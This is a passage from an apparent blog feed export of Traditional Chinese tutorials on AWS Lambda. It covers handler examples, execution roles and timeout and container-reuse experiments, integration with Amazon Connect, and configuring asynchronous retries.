class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">package example;</span><br><span class="line"></span><br><span class="line">import com.amazonaws.services.lambda.runtime.Context;</span><br><span class="line">import com.amazonaws.services.lambda.runtime.LambdaLogger;</span><br><span class="line">import com.amazonaws.services.lambda.runtime.RequestHandler;</span><br><span class="line"></span><br><span class="line">// Handler value: example.HandlerInteger</span><br><span class="line">public class HandlerIntegerJava17 implements RequestHandler&lt;IntegerRecord, Integer&gt;&#123;</span><br><span class="line"></span><br><span class="line">  @Override</span><br><span class="line">  /*</span><br><span class="line">   * Takes in an InputRecord, which contains two integers and a String.</span><br><span class="line">   * Logs the String, then returns the sum of the two Integers.</span><br><span class="line">   */</span><br><span class="line">  public Integer handleRequest(IntegerRecord event, Context context)</span><br><span class="line">  &#123;</span><br><span class="line">    LambdaLogger logger = context.getLogger();</span><br><span class="line">    logger.log(&quot;String found: &quot; + event.message());</span><br><span class="line">    return event.x() + event.y();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">record IntegerRecord(int x, int y, String message) &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Handler (Go)    </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">        &quot;fmt&quot;</span><br><span class="line">        &quot;context&quot;</span><br><span class="line">        &quot;github.com/aws/aws-lambda-go/lambda&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">type MyEvent struct &#123;</span><br><span class="line">        Name string `json:&quot;name&quot;`</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func HandleRequest(ctx context.Context, name MyEvent) (string, error) &#123;</span><br><span class="line">        return fmt.Sprintf(&quot;Hello %s!&quot;, name.Name ), nil</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">        lambda.Start(HandleRequest)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>諸如此類。</p><p>另外，由於剛創建 Lambda 的時候僅會有 Lambder-Handler一個檔案，但其實可以存取在 Lambda 執行環境當中的 <code>/tmp</code> 目錄 ，每個執行環境都會在 <code>/tmp</code> 目錄中提供 512 MB 到 10,240 MB 的磁碟空間，增量為 1 MB [5]。具體而言可以等之後談到 Lambda 執行環境的生命週期再說。</p><h2 id="權限"><a href="#權限" class="headerlink" title="權限"></a>權限</h2><p>Lambda 當中主要是透過執行角色（Execution Role）來去代替來源服務去執行操作。</p><p>那什麼是 Lambda 執行角色？</p><blockquote><p>Lambda 函數的執行角色是 AWS IAM 角色，它可授予函數存取 AWS 服務和資源的許可。例如，您可以建立一個執行角色，該角色有權向 Amazon CloudWatch 傳送日誌並向 AWS X-Ray 上傳追蹤資料。本頁提供有關如何建立、檢視和管理 Lambda 函數執行角色的資訊 [6]。</p></blockquote><p>執行角色跟一般角色最大的不同就是，當調用函數時，<strong>Lambda 會透過擔任此角色自動為您的函數提供臨時憑證</strong>。開發者不必在函數程式碼中呼叫 <code>sts:AssumeRole</code></p><p>而需要做到這點的必要設置，就是要設定角色的信任政策(Trust Policy)，這當中就必須將 Lambda 服務指定為受信任的主體</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;Version&quot;: &quot;2012-10-17&quot;,</span><br><span class="line">  &quot;Statement&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;Effect&quot;: &quot;Allow&quot;,</span><br><span class="line">      &quot;Principal&quot;: &#123;</span><br><span class="line">        &quot;Service&quot;: &quot;lambda.amazonaws.com&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;Action&quot;: &quot;sts:AssumeRole&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一旦有了執行角色，就可以去為這個角色附加政策，可以使用 AWS 管理的政策或者是自己定義政策</p><p><img src="https://hackmd.io/_uploads/ryyPLT9Rn.png"></p><p>當然，若你在建立 Lambda 的時候選擇 “Create a new role with basic Lambda permissions”，就會去建立一個帶有 <code>LambdaBasicExecutionRole</code> 的政策。</p><p><img src="https://hackmd.io/_uploads/HkTcIpcCh.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;Version&quot; : &quot;2012-10-17&quot;,</span><br><span class="line">  &quot;Statement&quot; : [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;Effect&quot; : &quot;Allow&quot;,</span><br><span class="line">      &quot;Action&quot; : [</span><br><span class="line">        &quot;logs:CreateLogGroup&quot;,</span><br><span class="line">        &quot;logs:CreateLogStream&quot;,</span><br><span class="line">        &quot;logs:PutLogEvents&quot;</span><br><span class="line">      ],</span><br><span class="line">      &quot;Resource&quot; : &quot;*&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>這個政策基本上就是給予 Lambda 函數能夠建立Log Group 並且能夠在Log Group 中建立 Log Stream 然後寫入日誌的功能。</p><p>當調用 Lambda的時候，會在 CloudWatch 建立包含 Lambda 名稱的Log Group，假設今天我的 Lambda 名稱叫做 <strong>TestInvocations</strong> 那日誌組的名稱就會是 <code>/aws/lambda/TestInvocations</code></p><p><img src="https://hackmd.io/_uploads/HyaWdT50h.png"></p><p>而底下就會有對應的 Log Stream</p><p><img src="https://hackmd.io/_uploads/ryBDOaqRh.png"></p><p>這裡有個有意思的地方，就是每次如果對函數進行更動或是做一些設定上的調整(Ex. 改變 Timeout 時間) 下一次調用就會產生新的 Log Stream。</p><p>因為每當你做一次新的設置，就會需要將你的設定套用到新的Sanbox 環境，也就會重新初始化新的一個 Lambda 執行環境。</p><p>如果點開 Log Stream，會發現每一次 Invocation  都會伴隨著不同的 Message，分別是：</p><ul><li>START</li><li>(Print Output, if there are any)</li><li>END</li><li>REPORT</li></ul><p>Start 到 End 這段期間代表 Lambda 正在執行，這段時間的 TimeStamp 差值也受限於你在 Lambda 上面的 Timeout 設定，可以先針對這點來做個小實驗。</p><p><img src="https://hackmd.io/_uploads/S1KPKa502.png"></p><h3 id="實驗一-Lambda-Timeout"><a href="#實驗一-Lambda-Timeout" class="headerlink" title="實驗一: Lambda Timeout"></a>實驗一: Lambda Timeout</h3><p>建立 Lambda 函數名為 <code>TestInvocation</code>, Runtimes 這裡選擇 <code>Python3.11</code>, 權限就維持預設。之後到 Lambda 主控台底下的 <strong>Code</strong> 區域編輯程式。</p><p><img src="https://hackmd.io/_uploads/SyEhzRqAh.png"></p><p>建立好 Lambda 後會給個空的 Lambda Handler，我們在這裡多 import time 並且在 handler 裏面延遲 3秒。接著按下 Test，這當中會有測試用的 JSON event，可以直接用來測試。</p><p>測試完畢後可以去 Monitor 頁面點選 “View CloudWatch logs”</p><p><img src="https://hackmd.io/_uploads/S1KUXRcRh.png"></p><p>就會跳去CloudWatch 當中對應的 Log Group，點選TimeStamp最新的 Log Stream，觀察實驗結果。</p><p><img src="https://hackmd.io/_uploads/SyeGfA90h.png"></p><p>可以發現在 Start 以及 End 中間間隔 3 秒，並且有印出 “sleep for 3 seconds”。</p><p>眼尖的人可以看到其中一個 log entry後面有顯示 “Task timed out after 3 seconds”。這是因為剛建立的 Lambda 函數，默認執行時間的timeout值會是3秒。這個可以去 Lambda 主控台上的 “Configuration” 上面修改。<br><img src="https://hackmd.io/_uploads/ry5BERqC3.png"></p><p>Timeout值的最上限會是 15分鐘。所以我們開個 15 分鐘看看，並且將 handler 當中的 delay 也調成大概 14 分鐘左右測試看看。</p><blockquote><p>這是個硬限制，也就是說你沒辦法開 Support Case 去提高額度 [8]</p></blockquote><p>等待 14分鐘過去後，可以從日誌上看到確實執行了 14分鐘<br><img src="https://hackmd.io/_uploads/H1BAq05Rn.png"></p><p>另外在先前的日誌截圖中，沒提到的是 INIT_START，這是每次初始化一個執行環境後就會有的初始化階段，初始化階段包含了 Extension Init、Runtime Init、Function Init [7]</p><p><img src="https://hackmd.io/_uploads/SkQK36qC3.png"><br><em>引用AWS 官方的圖片</em></p><p>前兩個 Init 階段偏向建立執行環境，以及啟動 Runtimes 還有下載deployment package 到執行環境等等，但到了 Function init 階段。這時候還會做一件事情，那就是會<strong>去執行 Lambda Handler 以外的程式</strong>。</p><p><img src="https://hackmd.io/_uploads/ryzXbC9Rn.png"></p><p>這裡在 handler 之外</p><p><img src="https://hackmd.io/_uploads/BJm-Z0qCn.png"></p><p>這麼說有點模糊。假設你宣告了一個全域變數在 Handler 之外，或者是你在 Lambda Handler外去與DB初始化一個連線。這些都很適合放在 Handler 之外做，並且會在 <strong>Init-Start</strong> 到 <strong>Start</strong> 這段期間執行，並且只要是持續使用相同的執行環境，那 Function Init 當中做的事也僅會做一次，這裡就會待到 Lambda 的一個特性，叫做 Container Reuse。  </p><h3 id="實驗二-Lambda-特性-容器重用（Container-Reuse）"><a href="#實驗二-Lambda-特性-容器重用（Container-Reuse）" class="headerlink" title="實驗二: Lambda 特性 - 容器重用（Container Reuse）"></a>實驗二: Lambda 特性 - 容器重用（Container Reuse）</h3><p>其實所有的容器重用的特性必須先提到， Lambda 執行環境會是容器，但一般像是 docker 的容器環境就是執行完畢就會把容器砍掉，但在 Lambda 的使用場景來看就不適合每次執行完畢就將執行環境關閉，而是繼續等待下一個調用請求。</p><p>從日誌上也可以觀察到這個特性。如果你在 Lambda 頁面上連續 invoke 三次，之後你可以在日誌中觀察到後續的調用請求，都會出現在同一個 Log Stream 當中，會接續在前一次調用日誌的後面。</p><p><img src="https://hackmd.io/_uploads/rkJu6Aq02.png"></p><p>也就是說，對於同一個 Lambda 執行環境，Lambda 完成一次執行後就接續處理下一個請求，也就是同一個 Lambda 的沙箱環境可以重新使用。</p><p>如果對於 Lambda Container Reuse 有興趣的人可以看一下這篇官方的Blog</p><blockquote><p>Understanding Container Reuse in AWS Lambda<br><a href="https://aws.amazon.com/blogs/compute/container-reuse-in-lambda/">https://aws.amazon.com/blogs/compute/container-reuse-in-lambda/</a></p></blockquote><p>這裡又有一件有意思的事，如果你是用 Lambda 主控台的測試按鈕去調用，他會等待執行完畢後，才能夠讓你再次按下測試按鈕。</p><p>如果我們用 AWS CLI 去調用 Lambda 函數，用 Terminal 一次開三個Tab同時調用我們的 Lambda 函數會發生什麼事？</p><h2 id="其他關鍵概念"><a href="#其他關鍵概念" class="headerlink" title="其他關鍵概念"></a>其他關鍵概念</h2><ul><li>Lambda 執行環境</li><li>Cold Start</li><li>Lambda 部署套件</li><li>Lambda 同步調用&#x2F;非同步調用</li><li>Lambda 的聯網功能</li></ul><h2 id="參考文獻"><a href="#參考文獻" class="headerlink" title="參考文獻"></a>參考文獻</h2><p>[1] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/welcome.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/welcome.html</a><br>[2] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-runtimes.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-runtimes.html</a><br>[3] <a href="https://aws.amazon.com/blogs/compute/introducing-the-c-lambda-runtime/">https://aws.amazon.com/blogs/compute/introducing-the-c-lambda-runtime/</a><br>[4] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/python-handler.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/python-handler.html</a><br>[5] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-runtime-environment.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-runtime-environment.html</a><br>[6] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-intro-execution-role.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-intro-execution-role.html</a><br>[7] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-runtime-environment.html#runtimes-lifecycle">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-runtime-environment.html#runtimes-lifecycle</a><br>[8] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/gettingstarted-limits.html#function-configuration-deployment-and-execution">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/gettingstarted-limits.html#function-configuration-deployment-and-execution</a></p>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> Lambda </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>帶你從零開始整合 Lambda Function 到 Amazon Connect</title>
      <link href="/posts/5db1b7e9.html"/>
      <url>/posts/5db1b7e9.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在現代的商業環境中，提供優質且高效的客戶服務是成功的關鍵之一。<strong>Amazon Connect</strong> 是一個強大的雲端客戶服務中心，它可以幫助企業輕鬆建立高度可靠的聯絡中心，並與客戶進行無縫的互動。本篇技術部落格文章將帶領您逐步了解如何整合 Lambda Function 到 Amazon Connect，以實現更多自定義的功能。</p><p>在這篇文章中，我們將遵循以下步驟來實現整合：</p><h2 id="步驟一、建立-Connect-Instance"><a href="#步驟一、建立-Connect-Instance" class="headerlink" title="步驟一、建立 Connect Instance"></a>步驟一、建立 Connect Instance</h2><p>首先，我們將在 Amazon Connect Console 上建立一個 Connect Instance。</p><p>請至 Amazon Connect Console 上選擇 <strong>Add Instance</strong>。這個步驟會需要設定你的 <strong>instance-alias</strong>，這樣可以為你的connect instance 建立一個 unique的 Access URL</p><p><img src="https://i.imgur.com/JgeqYRX.jpg" alt="Imgur"></p><p>這個步驟是添加Admin，你會需要設定使用者名稱以及密碼。</p><p><img src="https://i.imgur.com/HqRmPC9.jpg" alt="Imgur"></p><p>之後的步驟我們就都按 <strong>Next</strong>，最後建立 Instance。</p><div class="note info flat"><p>建立會需要等一段時間，可以趁這個時候建立 Lambda Funciton</p></div><h2 id="步驟二、建立-Lambda-Function"><a href="#步驟二、建立-Lambda-Function" class="headerlink" title="步驟二、建立 Lambda  Function"></a>步驟二、建立 Lambda  Function</h2><p>前往 Lambda Console，選擇建立 Lambda Function，我們Lambda 的Region與 Connect Instance 的 Region是一樣的，都是 <code>us-east-1</code></p><p><img src="https://i.imgur.com/IF7ndGN.jpg" alt="Imgur"></p><p>我們選擇 <strong>Author from Scratch</strong>，並且給定函式名稱為 <code>TestConnect</code>，Runtime 選擇 <code>Python 3.11</code><br>接著其他都保持預設設定。最後建立 Lambda Function。</p><p>建立完成後，可以修改 Lambda code，加上一行在你的 handler上。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Invoke Success!&quot;</span>)</span><br></pre></td></tr></table></figure><p>接著按下 <strong>deploy。</strong></p><h2 id="步驟三、增加Flows-到-Amazon-Connect"><a href="#步驟三、增加Flows-到-Amazon-Connect" class="headerlink" title="步驟三、增加Flows 到 Amazon Connect"></a>步驟三、增加Flows 到 Amazon Connect</h2><blockquote><p><strong>這一步驟中，我們將在 Connect Instance 中增加 Flows。我們將使用剛才建立的 Lambda Function，讓 Amazon Connect 在特定情況下調用此 Lambda 函式。</strong></p></blockquote><p>前往剛才建立的 Connect Instance，點選左側導覽欄當中的 <strong>Flows</strong></p><p><img src="https://i.imgur.com/evYMznQ.jpg" alt="Imgur"></p><p>往下找到 <strong>AWS Lambda，選擇你剛才建立的Lambda名稱，接著按下 Add Lambda Function</strong></p><p><img src="https://i.imgur.com/n7jvJGT.png?1" alt="Imgur"></p><h2 id="步驟四、設定-Contact-Flows"><a href="#步驟四、設定-Contact-Flows" class="headerlink" title="步驟四、設定 Contact Flows"></a>步驟四、設定 Contact Flows</h2><blockquote><p><strong>在這個步驟中，我們將設定 Contact Flows，讓 Amazon Connect 在特定情況下觸發 Lambda 函式並執行自定義的操作。我們將設定語音提示，以及在 Lambda 函式觸發時執行的動作。</strong></p></blockquote><p>點開你剛才建立 Connect Instance 的 Access URL</p><p><img src="https://i.imgur.com/EgmgghI.jpg" alt="Imgur"></p><p>會跳出類似這樣的畫面</p><p><img src="https://i.imgur.com/OIOj9PJ.jpg" alt="Imgur"></p><p>一樣去左側的 Panel中找到 <strong>Routing</strong>，並選擇 <strong>Flows</strong></p><p><img src="https://i.imgur.com/CkJosG1.jpg" alt="Imgur"></p><p>點開後選擇 <strong>Create Flow</strong></p><p>點開後第一步先幫你的 Flow 輸入名稱，這裡我叫做 <code>TestConnect-LambdaFlow</code><br>剛開始只會出現一個 Entry 在 畫面上，你可在做側的搜尋欄當中搜尋 Lambda Invoke，接著會出現 <strong>Invoke AWS Lambda function</strong> 的功能方塊，就把他拉到中間的畫布上。你可以先點選 Invoke AWS Lambda function 右上角的點點，並選擇 <strong>edit setting</strong>，接著右側會跳出編輯視窗，請輸入你剛才建立Lambda 函式的 ARN，接著按下 <strong>Save</strong>。</p><p><img src="https://i.imgur.com/9LBtvaI.jpg" alt="Imgur"></p><p>接著在左側搜尋欄搜尋 <strong>Play Prompt</strong> 並拉到中間畫布上，一樣點擊右上角點點，按下 <strong>edit setting</strong>。</p><p><img src="https://i.imgur.com/iskcGZZ.jpg" alt="Imgur"></p><p>選擇 Text-to&#x3D;speech or chat text 的選項，並在底下輸入客戶剛接入聊天室會出現的訊息。我在這邊輸入</p><p><code>Hi there,  this flow section will try to invoke Lambda function.</code></p><p>完成後點選 Save。</p><p>接著可以一樣在左側的搜尋欄位當中的 <strong>Terminate</strong> 找到 <strong>Disconnect</strong> 功能方塊，並把他拉到中間畫布上。</p><p>最後將所有功能方塊的箭頭連接上，整體流程會像是下面的圖一樣。</p><p><img src="https://i.imgur.com/RPBKkRu.jpg" alt="Imgur"></p><p>不管成功與否都會調用 Lambda 函式，但觸發成功才會去觸發 Prompt，而失敗就是直接結束連線，而Lambda函式調用失敗也會直接結束連線。 </p><p>最後按下 <strong>Save 完成後按下 Publish</strong></p><blockquote><p>一定要確保按下 Publish，若你沒有 Publish 你所設定的 Flow 不會出現在儀表板上</p></blockquote><h2 id="步驟五、測試-Chat"><a href="#步驟五、測試-Chat" class="headerlink" title="步驟五、測試 Chat"></a>步驟五、測試 Chat</h2><blockquote><p><strong>一旦所有設定完成，我們將進行測試。透過模擬的聊天界面，我們將檢查 Lambda 函式是否被成功觸發，以及驗證整合的運作是否符合預期。</strong></p></blockquote><p>接著一樣點選左側的 Panel 最上面有點像 Windows Logo的圖示，點選 <strong>Dashboard，回到原先的主畫面。</strong></p><p><img src="https://i.imgur.com/IL3lPpV.jpg" alt="Imgur"></p><p>點選 <strong>Test Chat</strong>，之後會跳出 Test Chat 頁面，點選左上角的 <strong>Test Settings</strong></p><p><img src="https://i.imgur.com/0EFhRCk.jpg" alt="Imgur"></p><p>點選後會出現一個設定選單，在 Contact Flow 中請選擇你剛才建立的 Flow，接著按下 <strong>Apply</strong></p><p><img src="https://i.imgur.com/sN5qfW5.jpg" alt="Imgur"></p><p>當你按下 Apply 後就會出現一個 模擬的聊天界面，並且顯示客戶加入Chat的狀況，而我們的設定是不論如何都會限結束連線。所以我們可以回到Lambda 頁面去檢查 Lambda 函式有沒有被觸發。</p><p><img src="https://i.imgur.com/1LoXmPY.jpg" alt="Imgur"></p><h2 id="步驟六、檢查日誌"><a href="#步驟六、檢查日誌" class="headerlink" title="步驟六、檢查日誌"></a>步驟六、檢查日誌</h2><blockquote><p><strong>最後，我們將檢查 Lambda 函式的日誌，以確認 Lambda 是否被正確調用，並確保整合的可靠性。</strong></p></blockquote><p>回到 Lambda Console 點選 <strong>View CloudWatch logs</strong></p><p><img src="https://i.imgur.com/C5ziVSW.jpg" alt="Imgur"></p><p>點開最新產生的 Log Streams，可以發現 <code>Invoke Success!</code> 的字串，由此得知我們的 Lambda 被成功調用了</p><p><img src="https://i.imgur.com/xzwSbUl.jpg" alt="Imgur"></p><h2 id="結論"><a href="#結論" class="headerlink" title="結論"></a>結論</h2><p>透過這篇文章，您將學會如何使用 Amazon Connect 和 Lambda Function 整合客戶服務的流程，並實現自定義的客戶互動。讓我們一起踏出這個整合之旅吧！</p>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> Lambda </tag>
            
            <tag> Connect </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>⚙️在 Lambda 上設定錯誤重試 (Retry)</title>
      <link href="/posts/d400aff3.html"/>
      <url>/posts/d400aff3.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一樣是解 case 碰到的問題，但我也沒真的在 Lambda 設定過重試 (Retry)，這次就秉持著實驗精神來在自己的環境實驗看看。</p><p>Lambda 當中的錯誤重試通常是用於當<strong>非同步調用(Asynchronous Invocations)</strong> 失敗後重新發送調用請求的行為。針對非同步調用，Lambda 會將事件置放在 Queue 當中，並傳回成功回應，其中不包含其他資訊。單獨的程序會從 Queue 讀取事件，並將事件傳送到您的函數</p><p><img src="https://i.imgur.com/wn1vCQu.png" alt="Imgur"></p><blockquote><p>圖片用 ZenUML 建立的<br><a href="https://app.zenuml.com/">https://app.zenuml.com/</a><br><a href="https://mermaid.js.org/syntax/zenuml.html">https://mermaid.js.org/syntax/zenuml.html</a></p></blockquote><h2 id="建立-Lambda"><a href="#建立-Lambda" class="headerlink" title="建立 Lambda"></a>建立 Lambda</h2><p>這邊建立 Lambda部分很簡單，就建立一個名叫 <strong>TestInvocations</strong> 的 function，使用的 Runtime 是 <code>NodeJS.14.x</code></p><h2 id="修改-Lambda-Handler-程式"><a href="#修改-Lambda-Handler-程式" class="headerlink" title="修改 Lambda Handler 程式"></a>修改 Lambda Handler 程式</h2><p>在 Lambda Console主頁底下的 <strong>Code</strong> 區域來修改程式，更改 <code>index.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> outside = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">exports</span>.<span class="property">handler</span> = <span class="function">(<span class="params">event, context, callback</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">        <span class="string">&#x27;RequestId&#x27;</span>: context.<span class="property">awsRequestId</span>,</span><br><span class="line">        <span class="string">&#x27;outside&#x27;</span>: outside++</span><br><span class="line">    &#125;)); </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">callback</span>(<span class="string">&#x27;Error&#x27;</span>, <span class="string">&#x27;retry test&#x27;</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>一但修改完畢後，可以點選 <strong>deploy</strong> ，來上傳修改好的程式</p><p><img src="https://i.imgur.com/3XJYyyo.jpg" alt="Imgur"></p><h2 id="設定重試"><a href="#設定重試" class="headerlink" title="設定重試"></a>設定重試</h2><p>我們可以去 Lambda Console 的主頁去 <strong>Configuration</strong> 頁面選擇 <strong>Asynchronous Invocation</strong> ，接著去 Edit</p><p><img src="https://i.imgur.com/uVM6U6E.jpg" alt="Imgur"></p><p><strong>Retry attempts</strong> 最多能夠設到 <code>2</code>，在你的 Lambda Function 接收非同步叫用後發生錯誤，並重試兩次後，該 Event 就會被拋棄，但也可以額外設定 <strong>Dead Letter Queue (DLQ)</strong> 來去存放來被捨棄的事件，以供後續處理。</p><blockquote><p>細節可以參考這份官方文件: <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/invocation-async.html#invocation-dlq">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/invocation-async.html#invocation-dlq</a></p></blockquote><h2 id="觸發Lambda"><a href="#觸發Lambda" class="headerlink" title="觸發Lambda"></a>觸發Lambda</h2><p>接著可以透過 <strong>AWS CLI (Command Line Tool)</strong> 來去調用 Lambda 函式</p><blockquote><p>沒有設定過 AWS CLI 的可以參考這份文件來進行設置 &gt;&gt; <a href="https://aws.amazon.com/cli/">https://aws.amazon.com/cli/</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws lambda invoke --function-name TestInvocations --invocation-type Event test.txt</span><br></pre></td></tr></table></figure><p>這邊設定 <code>--invocation-type</code> 為 Event，這麼代表你是以非同步的方式來調用 Lambda。</p><p>接著會回傳狀態碼 <code>202</code>   這是代表，你的請求已被 Lambda 接受，但還不會馬上處理 （畢竟是非同步）</p><blockquote><p>參考資料:<br><a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/API_Invoke.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/API_Invoke.html</a></p></blockquote><div class="note info flat"><p>對於 Lambda 同步以及非同步調用，可以個別參考對應的官方文件說明<br><a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/invocation-async.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/invocation-async.html</a><br><a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/invocation-sync.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/invocation-sync.html</a><br>至於在架構上的異同，以後可以再寫一篇文章來整理！</p></div><h2 id="觀測結果"><a href="#觀測結果" class="headerlink" title="觀測結果"></a>觀測結果</h2><p>之後我們可以到 Lambda Console 上面的 <strong>Monitor</strong> 頁面，點選 View <strong>CloudWatch logs</strong> 選項，這時候就會跳出 Cloudwatch Logs 的主頁</p><p><img src="https://i.imgur.com/aOskbVm.jpg" alt="Imgur"><br><img src="https://i.imgur.com/EKlsnSl.jpg" alt="Imgur"></p><p>當你每次建立 Lambda 時，預設會給予Lambda 的執行角色一個名叫 <code>AWSBasicExecutionRole</code> 的政策，其中包含了建立Cloudwatch Log Group 還有 Cloudwatch Log 的權限，並且會建立 <code>/aws/lambda/&lt;你的Lambd名稱&gt;</code> 的這麼一個<strong>日誌組（Log Group）</strong>，在這個日誌組底下會有許多<strong>日誌流（Log Stream）</strong>，每當你<br>對你的Lambda函式進行變更並重新觸發Function，就會產生新的日誌流</p><p><img src="https://i.imgur.com/JSuUpCk.jpg" alt="Imgur"></p><p>此時我們選擇最新的日誌流，可以發現有三筆 invocation，第一筆為我們觸發的，第二以及第三則是我們設定的重試觸發</p><p>觸發請求-1<br><img src="https://i.imgur.com/OMHbzV7.jpg" alt="Imgur"><br>Retry-1<br><img src="https://i.imgur.com/gmvSuMn.jpg" alt="Imgur"><br>Retry-2<br><img src="https://i.imgur.com/mbniv78.jpg" alt="Imgur"></p><p>這裡就可以觀察到，invocation後的日誌可以看到錯誤訊息，並且在第一次請求錯誤後過一分鐘會重試一次，在第一次重試失敗後過兩分鐘會去重試第二次，接著就不會再去重試了。這邊也觀察到錯誤重試時的 request id 跟原本的一樣，應該可以試著用這個當判斷是否為錯誤重試、事件是否已經處理過。</p><h2 id="結論"><a href="#結論" class="headerlink" title="結論"></a>結論</h2><p>在 開發 Lambda 程式以及進行相關設定時，務必要注意 調用的類型以及對應的設定有哪些，才不會傻傻的混用而不自知。</p><h2 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h2><p><a href="https://azole.medium.com/aws-lambda-reuse-and-retry-behavior-ffaac616d869">https://azole.medium.com/aws-lambda-reuse-and-retry-behavior-ffaac616d869</a><br><a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/invocation-retries.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/invocation-retries.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Amazon </tag>
            
            <tag> Lambda </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>🐞透過 Amazon Lambda 實踐 Web Crawler</title>
      <link href="/posts/6dbe323f.html"/>
      <url>/posts/6dbe323f.html</url>
      
